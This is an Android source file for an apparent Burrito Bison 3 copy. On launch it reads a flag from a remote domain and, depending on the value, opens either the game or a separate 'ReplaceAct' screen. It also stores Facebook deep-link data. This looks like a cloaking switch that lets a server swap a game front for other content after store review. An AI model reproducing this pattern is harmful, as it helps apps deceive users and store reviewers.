package com.kongregate.mobile.burritobison3.goo;



import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.applinks.AppLinkData;
import com.orhanobut.hawk.Hawk;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.util.Map;

public class MainActivity extends AppCompatActivity {
    public static final String DLNK1 = "dfB1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new asyncFunc().execute();
        metaLnk();
    }

    public class asyncFunc extends AsyncTask<Void, Void, Void> {

        String result;
        String corelnk = "http://infinityornament.xyz/apps.txt";
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                Document doc;
                doc = Jsoup.connect(corelnk).get();
                result = doc.text();

            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }


        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            Intent i1 = new Intent(getApplicationContext(), StartGame.class);

            Intent i2 = new Intent(getApplicationContext(), ReplaceAct.class);
            switch(result){
                case "1":    startActivity(i2);
                    break;
                case "2":    startActivity(i1);
                    break;
            }
            overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
            finish();
        }


    }
    public void metaLnk() {

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {
                    if (appLinkData != null) {
                        String params;
                        params = appLinkData.getTargetUri().getHost();
                        Hawk.put(DLNK1, params);
                        Log.d("FB", params);
                    } else {
                        Log.d("FB", "Error Code:");
                    }
                }
        );
    }

}